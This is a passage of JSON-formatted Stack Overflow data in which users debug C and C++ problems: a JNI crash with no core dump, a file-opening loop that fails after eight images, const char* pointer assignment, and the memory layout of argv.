{"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1457530534, "post_id": 35886795, "comment_id": 59446951, "body": "Meanwhile I&#39;ve found out that the &quot;part.x&quot; suffix means that partial inlining has been executed, which is an optimisation technique. By modifying the optimisation options (e.g. -O0 for disabling all optimisations) during compilation, those suffixes can be avoided."}], "owner": {"reputation": 8351, "user_id": 4279155, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/841b7391f3f7873bec1a8d9d8d2dc759?s=128&d=identicon&r=PG&f=1", "display_name": "Dominique", "link": "https://stackoverflow.com/users/4279155/dominique"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 165, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1457537700, "creation_date": 1457513213, "last_edit_date": 1457537700, "question_id": 35886795, "link": "https://stackoverflow.com/questions/35886795/how-to-solve-jni-crashes-on-a-linux-machine-without-core-dumps", "title": "How to solve JNI crashes on a Linux machine without core dumps", "body": "<p>I'm working on a program, where the Java part launches C++ code using JNI interface. This program is installed on a Linux machine (CentOS), but while launching the program (using \"java \"), I see the following:</p>\n\n<pre><code>#\n# A fatal error has been detected by the Java Runtime Environment:\n#\n#  SIGSEGV (0xb) at pc=0x06da0fdd, pid=4970, tid=3086470032\n#\n# JRE version: Java(TM) SE Runtime Environment (7.0_60-b19) (build 1.7.0_60-    b19)\n# Java VM: Java HotSpot(TM) Client VM (24.60-b09 mixed mode linux-x86 )\n# Problematic frame:\n# C  [libmain_project.so+0x782fdd]  _Z8ulm_initPKcb.part.6+0x393\n#\n# Failed to write core dump. Core dumps have been disabled. To enable core dumping, try \"ulimit -c unlimited\" before starting Java again\n...\n</code></pre>\n\n<p>In order to have more information, I have already added the line <code>ulimit -c unlimited</code> just before launching the Java class, but that seems not to work. (it seems that in some shells the command <code>ulimit</code> is replaced by <code>limit</code>)</p>\n\n<p>About the structure of the main project: every *.c file has been compiled into an *.o file (using g++). Different *.o files are grouped into *.a files (ar archives), and those have then been collected into one big libmain_project.so file, again using g++.</p>\n\n<p>I have already found the *.o file which contains the \"_Z8ulm_initPKcb.part.6\" part:</p>\n\n<pre><code>$ nm -AC ulm.o | grep ulm_init\n...\nulm.o:0000216e T ulm_init(char const*, bool)\nulm.o:00001c52 t _Z8ulm_initPKcb.part.6\n</code></pre>\n\n<p>This indicates that there are two \"ulm_init\" instances within the ulm.o file, but while having a look into the ulm.c file, I only find the following function:</p>\n\n<pre><code>void *ulm_init(const char* szVersion, bool bAllocDaemonCoexistence)\n</code></pre>\n\n<p>Which is called once:</p>\n\n<pre><code>void ulm_map_init(const char* szVersion) {\n   ulm_init(szVersion);\n}\n</code></pre>\n\n<p>My problems are:\n<li>How can I found out the meaning of _Z8ulm_initPKcb.part.6 (what does this \"part.6\" stand for?)?\n<li>Even once I know what it stands for, how can I start calculating the \"+0x393\"? I have already tried to have a look at the ulm.o code:</p>\n\n<pre><code>Prompt&gt;nm -AC ulm.o | sort\nulm.o:00001c52 t _Z8ulm_initPKcb.part.6\nulm.o:0000216e T ulm_init(char const*, bool)\n</code></pre>\n\n<p>As you can see, 1c52 + 0x393 &lt; 216e => so the problem should be located within _Z8ulm_initPKcb.part.6, but how to interprete this?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 2254, "user_id": 2231893, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/97ea6d5a1ba63e1d6d2a9a8bf075dc16?s=128&d=identicon&r=PG", "display_name": "abasu", "link": "https://stackoverflow.com/users/2231893/abasu"}, "edited": false, "score": 4, "creation_date": 1457512894, "post_id": 35886663, "comment_id": 59434888, "body": "show us the complete code (mini-version in case of large code), and more importantly, what have you tried? (something like google about gdb, valgrind )"}, {"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "reply_to_user": {"reputation": 2254, "user_id": 2231893, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/97ea6d5a1ba63e1d6d2a9a8bf075dc16?s=128&d=identicon&r=PG", "display_name": "abasu", "link": "https://stackoverflow.com/users/2231893/abasu"}, "edited": false, "score": 0, "creation_date": 1457513276, "post_id": 35886663, "comment_id": 59435113, "body": "just reading multiple image file from a folder using gcc linux. The function_foo returns the rows and column data of an image. Structure_Name is a structure for holding the image data."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1457516286, "post_id": 35886663, "comment_id": 59436910, "body": "Is there are reason why you aren&#39;t using an array? <code>FILE* fp_arr = malloc( sizeof(FILE*[n]) );</code>"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1457516309, "post_id": 35886663, "comment_id": 59436932, "body": "What is the value of &#39;total&#39; etc.?   Not what you think it is, what it actually is - from your debugger.:)"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1457516603, "post_id": 35886663, "comment_id": 59437149, "body": "What is line[] and what is it filled with?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 2254, "user_id": 2231893, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/97ea6d5a1ba63e1d6d2a9a8bf075dc16?s=128&d=identicon&r=PG", "display_name": "abasu", "link": "https://stackoverflow.com/users/2231893/abasu"}, "edited": false, "score": 0, "creation_date": 1457516640, "post_id": 35886663, "comment_id": 59437172, "body": "You are not giving us enough - read again what @abasu wrote above."}, {"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457516867, "post_id": 35886663, "comment_id": 59437345, "body": "Hi James, total = number of files in a directory; line[ ] contains the names of the files that are there in the directory."}, {"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457520810, "post_id": 35886663, "comment_id": 59440066, "body": "yes the file names are correct and NULL check has also been done, see the Update given by iila below.."}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457515431, "post_id": 35886820, "comment_id": 59436348, "body": "Now I have included fclose(fp[i]) , after calling the function function_foo inside the loop. That means now the files are closed after reading is done. But the same problem persists. Again, by reducing the value 10000 to 10 the program is able to open only 2 files. Any suggestion ?"}, {"owner": {"reputation": 4270, "user_id": 2707359, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8754698c78ca3a082e1593688a9df99c?s=128&d=identicon&r=PG&f=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/2707359/ilya"}, "reply_to_user": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457518626, "post_id": 35886820, "comment_id": 59438626, "body": "Ok, I updated the answer (and added an information about <code>total</code>, requested by Martin James). Please tell us, do you see the same problem."}, {"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457519385, "post_id": 35886820, "comment_id": 59439123, "body": "The same error :  total=11 0 of 11, /home/souvik/Images/LPF_ChangeR_-4.pgm 1 of 11, /home/souvik/Images/LPF_ChangeR_3.pgm 2 of 11, /home/souvik/Images/LPF_ChangeR_-5.pgm 3 of 11, /home/souvik/Images/LPF_ChangeR_5.pgm 4 of 11, /home/souvik/Images/LPF_ChangeR_-3.pgm 5 of 11, /home/souvik/Images/LPF_ChangeR_1.pgm 6 of 11, /home/souvik/Images/LPF_ChangeR_4.pgm 7 of 11, /home/souvik/Images/LPF_ChangeR_-1.pgm 8 of 11, /home/souvik/Images/LPF_ChangeR_0.pgm 9 of 11, /home/souvik/Images/LPF_ChangeR_2.pgm  Process returned -1 (0xFFFFFFFF)   execution time : 42.209 s Press ENTER to continue."}, {"owner": {"reputation": 2254, "user_id": 2231893, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/97ea6d5a1ba63e1d6d2a9a8bf075dc16?s=128&d=identicon&r=PG", "display_name": "abasu", "link": "https://stackoverflow.com/users/2231893/abasu"}, "edited": false, "score": 2, "creation_date": 1457519540, "post_id": 35886820, "comment_id": 59439224, "body": "I&#39;ll suggest use valgrind and check, if it is running for 42.209 s, there&#39;s some heavyweight things being done, have you tried some simple things like, instead of function_foo, do a fseek and print the size, see, if you are getting the data or not, try to triangulate the problem"}, {"owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457521275, "post_id": 35886820, "comment_id": 59440381, "body": "all the data upto data[9] are obtained and the the program returns -1 while fetching the 10th file name (i.e. when i = 10 in the loop ). Any suggestion ?"}, {"owner": {"reputation": 4270, "user_id": 2707359, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8754698c78ca3a082e1593688a9df99c?s=128&d=identicon&r=PG&f=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/2707359/ilya"}, "reply_to_user": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "edited": false, "score": 0, "creation_date": 1457521867, "post_id": 35886820, "comment_id": 59440769, "body": "@SouvikKundu in your code the array <code>data</code> contains only 100 elements, but the array <code>fp</code> contains 10000 elements. And after it you call <code>function_foo(fp[i],(data[i]))</code> (i.e. with the same index <code>i</code>). I expect that you have similar mistakes somewhere else in this program (and it might be the reason of breaking of something unexpected in the memory)."}], "tags": [], "owner": {"reputation": 4270, "user_id": 2707359, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8754698c78ca3a082e1593688a9df99c?s=128&d=identicon&r=PG&f=1", "display_name": "Ilya", "link": "https://stackoverflow.com/users/2707359/ilya"}, "is_accepted": false, "score": 2, "last_activity_date": 1457518518, "last_edit_date": 1495541750, "creation_date": 1457513287, "answer_id": 35886820, "question_id": 35886663, "link": "https://stackoverflow.com/questions/35886663/error-encountered-while-dynamic-memory-allocation-in-c/35886820#35886820", "title": "Error Encountered while Dynamic Memory allocation in C", "body": "<p>It is a really bad idea to open 10000 files at the same time. I'd recommend you to change this logic: to read content of these files one by one, and to send this content to your function <code>function_foo</code>. But currently your code tries to <code>fopen</code> very big number of files without closing of it. I expect it is the main problem (i.e. it seems that in your environment maximal number of files that can by opened is 8).</p>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/17931583/maximum-number-of-files-that-can-be-opened-by-c-fopen-in-linux\">Maximum number of files that can be opened by c &quot;fopen&quot; in linux</a></li>\n<li><a href=\"https://stackoverflow.com/questions/870173/is-there-a-limit-on-number-of-open-files-in-windows\">Is there a limit on number of open files in Windows</a></li>\n</ul>\n\n<p><strong>Update:</strong></p>\n\n<p>Since you don't need an array of all pointers, you can try following version. Do you see the same problem in this case?</p>\n\n<pre><code>FILE *fp;\nstruct Structure_Name data[100];\n\nfor(i=0; i&lt;total; i++)\n{\n  sprintf(fName,\"/home/souvik/Images/%s\", line[i]);\n  printf(\"%d of %d, %s\\n\", i, total, fName);\n  fp = fopen(fName, \"rb\");\n  if (fp != NULL)\n  {\n    data[i]=function_foo(fp,(data[i]));\n    fclose(fp);\n  } else\n  {\n    printf(\"A null pointer is returned by fopen()\");\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "is_accepted": false, "score": 0, "last_activity_date": 1458211537, "creation_date": 1458211537, "answer_id": 36058255, "question_id": 35886663, "link": "https://stackoverflow.com/questions/35886663/error-encountered-while-dynamic-memory-allocation-in-c/36058255#36058255", "title": "Error Encountered while Dynamic Memory allocation in C", "body": "<p>@ALL, Thanks for your active help. </p>\n\n<p>Now the problem is solved. The root cause of the problem was that, while the program was looping through all the images it was storing the image data in data[i] , i.e. data[1], data[2], data[3], data[4]......... the data is temporarily stored in \\var folder during program execution. after reading 9 image files the total size of 9 images (data[1]+data[2]+data[3]+..... data[9]) exceeds the size of \\var in our machines. We simply de-allocated the space allocated for the structure variable data[i] after each iteration. This solved the problem. </p>\n"}], "owner": {"reputation": 29, "user_id": 5590981, "user_type": "registered", "profile_image": "https://graph.facebook.com/924688950947738/picture?type=large", "display_name": "Souvik Kundu", "link": "https://stackoverflow.com/users/5590981/souvik-kundu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 72, "favorite_count": 1, "closed_date": 1458611632, "answer_count": 2, "score": -1, "last_activity_date": 1458211537, "creation_date": 1457512729, "last_edit_date": 1457513514, "question_id": 35886663, "link": "https://stackoverflow.com/questions/35886663/error-encountered-while-dynamic-memory-allocation-in-c", "closed_reason": "Not suitable for this site", "title": "Error Encountered while Dynamic Memory allocation in C", "body": "<p>In the below code, <code>line[]</code> array contains names of all image files contained in a folder. We are just reading the names dynamically and sending the file names one by one to a function <code>function_foo</code> as given in the code. When there are 8 images the code is executing as expected. But as soon as we increase the number of image files in the folder to any number above 8, the process gets terminated and returns -1. Please suggest.</p>\n\n<pre><code>FILE **fp;\nstruct Structure_Name data[100];\nfp = malloc( sizeof(FILE *) * 10000);\n\nfor(i=0;i&lt;total; i++)\n{\n  sprintf(fName,\"/home/souvik/Images/%s\",line[i]);\n  printf(\"%s\\n\",fName);\n  fp[i] = fopen(fName, \"rb\");\n  data[i]=function_foo(fp[i],(data[i]));\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers", "char", "constants"], "comments": [{"owner": {"reputation": 1011, "user_id": 3891638, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/pqkeX.jpg?s=128&g=1", "display_name": "cozyconemotel", "link": "https://stackoverflow.com/users/3891638/cozyconemotel"}, "edited": false, "score": 1, "creation_date": 1457512908, "post_id": 35886581, "comment_id": 59434899, "body": "What do you mean you can&#39;t? What did you try and what were the results?"}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 1, "creation_date": 1457513212, "post_id": 35886581, "comment_id": 59435075, "body": "A good place to start would be to declare the pointer correctly.  What you have should give a compile-time error due to incompatible pointer types."}, {"owner": {"reputation": 401, "user_id": 5872512, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7c4221f927634b5a3129fdaf32620a7d?s=128&d=identicon&r=PG&f=1", "display_name": "C-Jay", "link": "https://stackoverflow.com/users/5872512/c-jay"}, "edited": false, "score": 0, "creation_date": 1461858982, "post_id": 35886581, "comment_id": 61401189, "body": "okay you&#39;re right, i should compile the code before posting next time"}], "answers": [{"comments": [{"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457513602, "post_id": 35886823, "comment_id": 59435282, "body": "I tend to view dynamic array initializations as a bad idea (and a bad addition to the C language).  <code>keyContainer</code> should really be static."}, {"owner": {"reputation": 588, "user_id": 2369473, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kFB7o.png?s=128&g=1", "display_name": "haltode", "link": "https://stackoverflow.com/users/2369473/haltode"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457513789, "post_id": 35886823, "comment_id": 59435394, "body": "I totally agree with you, but this was to explain why the pointer was badly initialized."}, {"owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457513859, "post_id": 35886823, "comment_id": 59435433, "body": "It would have been better to place <code>keyContainer</code> outside of the function (and possibly <code>keyPtr</code> as well for simplicity)."}, {"owner": {"reputation": 588, "user_id": 2369473, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kFB7o.png?s=128&g=1", "display_name": "haltode", "link": "https://stackoverflow.com/users/2369473/haltode"}, "reply_to_user": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "edited": false, "score": 0, "creation_date": 1457513969, "post_id": 35886823, "comment_id": 59435495, "body": "Well, sure but this is just an example, I took his code and put it in a main function. I will edit this."}], "tags": [], "owner": {"reputation": 588, "user_id": 2369473, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kFB7o.png?s=128&g=1", "display_name": "haltode", "link": "https://stackoverflow.com/users/2369473/haltode"}, "is_accepted": true, "score": 2, "last_activity_date": 1457514000, "last_edit_date": 1457514000, "creation_date": 1457513303, "answer_id": 35886823, "question_id": 35886581, "link": "https://stackoverflow.com/questions/35886581/pointer-assignment-to-const-char-in-c/35886823#35886823", "title": "pointer assignment to const char*[] in c", "body": "<p>When you use this, you get the warning \"Initialization from incompatible pointer type [enabled by default]\", and that's because <code>keyContainer</code> is <code>char *[2]</code>, which we will say can be <strong>similar</strong> (not the same !) as <code>char **</code>. So you need to use <code>const char **keyPtr = keyContainer;</code>.</p>\n\n<p>For example :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nconst char *keyContainer[2]= {\"test\", \"test2\" };\nconst char **keyPtr = keyContainer;\n\nint main(void)\n{\n   printf(\"%s\\n\", keyPtr[0]);\n   printf(\"%s\\n\", keyPtr[1]);\n\n   return 0;\n}\n</code></pre>\n\n<p>Hope this helps !</p>\n"}], "owner": {"reputation": 401, "user_id": 5872512, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/7c4221f927634b5a3129fdaf32620a7d?s=128&d=identicon&r=PG&f=1", "display_name": "C-Jay", "link": "https://stackoverflow.com/users/5872512/c-jay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 891, "favorite_count": 0, "accepted_answer_id": 35886823, "answer_count": 1, "score": -1, "last_activity_date": 1461858826, "creation_date": 1457512512, "last_edit_date": 1461858826, "question_id": 35886581, "link": "https://stackoverflow.com/questions/35886581/pointer-assignment-to-const-char-in-c", "title": "pointer assignment to const char*[] in c", "body": "<p>I'd like to assign a pointer to a const char* array like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n\nconst char *keyContainer[2]= {\"test\", \"test2\" };\nconst char *keyPtr = &amp;keyContainer;\n\n\nint main(void)\n{  \n   printf(\"%s\\n\", keyPtr[0]);     //test\n   printf(\"%s\\n\", keyPtr[1]);     //test2\n\n   return 0;\n}\n</code></pre>\n\n<p>keyPtr contains the address of keyContainer but I can't get access to the content of keyContainer.</p>\n"}, {"tags": ["c++", "c", "pointers"], "comments": [{"owner": {"reputation": 1904, "user_id": 1545952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/aMD46.jpg?s=128&g=1", "display_name": "Xvolks", "link": "https://stackoverflow.com/users/1545952/xvolks"}, "edited": false, "score": 3, "creation_date": 1457512689, "post_id": 35886554, "comment_id": 59434774, "body": "Why not testing by yourself? Show what you have done to answer your question."}, {"owner": {"reputation": 31465, "user_id": 128384, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/cf6f92bfb2a16c0e2c6ca7aef4440862?s=128&d=identicon&r=PG", "display_name": "stijn", "link": "https://stackoverflow.com/users/128384/stijn"}, "edited": false, "score": 2, "creation_date": 1457512707, "post_id": 35886554, "comment_id": 59434784, "body": "It&#39;s <code>char**</code>, why do you expect it to hold anything else than char*, i.e. pointers?"}, {"owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "edited": false, "score": 0, "creation_date": 1457515463, "post_id": 35886554, "comment_id": 59436370, "body": "I don&#39;t know much about stack overflow. But I think that people love to say &#39;Oh! Its a duplicate question&#39;. Also down vote. It just breaks the backbone of newbie. Who after 1 down vote thinks a thousand time before adsing another question. And newbie being newbie some times decides against posting genuine question. I understand that this behavior is essential to keep up quality here. But can there be a middle ground, something like stack overflow -- where newbie could post and if it gets certain point there, his question can be transfered here. Of course, that will take time but ."}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1457524080, "post_id": 35886554, "comment_id": 59442396, "body": "@imox: Such a site would not draw experts to answer your questions. Who is willing to answer the same question over and over? StackOverflow achieves its goals because of the rules. And those goals are to have the best answers for every <i>unique</i> question. This does include newbie questions, but not duplicate newbie questions."}, {"owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "reply_to_user": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1457528371, "post_id": 35886554, "comment_id": 59445382, "body": "@MSalters I fully agree with you. But a newbie finds very difficult to know that his question is a duplicate one. His question will be a paraphrase (maybe mine)  and he will continue saying its not a duplicate. I only said to find a middle ground. I myself will try to do better homework before posting a question, maybe then I can learn even more. Anyways, cheers to everyone involved for the top notch work."}], "answers": [{"comments": [{"owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "edited": false, "score": 0, "creation_date": 1457514600, "post_id": 35886983, "comment_id": 59435850, "body": "Really informative answer. Please clear one more doubt. How does argc know how many argument? Is it on getting \\n? And probably 02124 should be \\0 not 02125."}, {"owner": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "reply_to_user": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "edited": false, "score": 1, "creation_date": 1457514749, "post_id": 35886983, "comment_id": 59435922, "body": "@imox on call to <code>exec()</code> OS can traverse the array of pointers you passed until it finds NULL; that&#39;s how it deduces argc, right before sending it to your program."}, {"owner": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "reply_to_user": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "edited": false, "score": 0, "creation_date": 1457514813, "post_id": 35886983, "comment_id": 59435964, "body": "@imox See <code>man (2) execvp</code> : &quot;The array of pointers must  be terminated by  a null pointer.&quot; -- For just that reason."}, {"owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "reply_to_user": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "edited": false, "score": 0, "creation_date": 1457514951, "post_id": 35886983, "comment_id": 59436050, "body": "@Yam that is informative. Now I can say that I have somewhat understood it ."}, {"owner": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "edited": false, "score": 0, "creation_date": 1457514962, "post_id": 35886983, "comment_id": 59436056, "body": "Also, &quot;argv (points to memory address of argv[0]&quot; would mean <code>*argv == &amp;argv[0]</code> which isn&#39;t the case. <code>argv</code> points directly to <code>argv[0]</code>, because <code>argv[0] == *(argv + 0) == *argv</code>"}, {"owner": {"reputation": 87138, "user_id": 136540, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/a4d5888f021e337d09be5b3109c11e72?s=128&d=identicon&r=PG", "display_name": "Michael Aaron Safyan", "link": "https://stackoverflow.com/users/136540/michael-aaron-safyan"}, "reply_to_user": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "edited": false, "score": 0, "creation_date": 1457515053, "post_id": 35886983, "comment_id": 59436118, "body": "@YamMarcovic my notation here was intended to convey the fact that the variable &quot;argv&quot; has its own storage (on the function stack). The value of that variable is the address of &quot;argv[0]&quot;. I&#39;ve replaced &quot;points to memory address&quot; with &quot;value is the memory address&quot; to address your concern, though I think it was clear enough given the context."}, {"owner": {"reputation": 7447, "user_id": 602372, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/q6bLu.jpg?s=128&g=1", "display_name": "Yam Marcovic", "link": "https://stackoverflow.com/users/602372/yam-marcovic"}, "edited": false, "score": 0, "creation_date": 1457515332, "post_id": 35886983, "comment_id": 59436292, "body": "Yep. I think your edit is better, because the phrase &quot;x points to y&quot; is reserved and thus problematic to change in this specific context (which deals with pointer variables)."}, {"owner": {"reputation": 1334, "user_id": 4068690, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/4e778e8c8d892818024543a0176099c7?s=128&d=identicon&r=PG", "display_name": "imox", "link": "https://stackoverflow.com/users/4068690/imox"}, "edited": false, "score": 0, "creation_date": 1457515921, "post_id": 35886983, "comment_id": 59436677, "body": "Thank you @Michael and Yam for 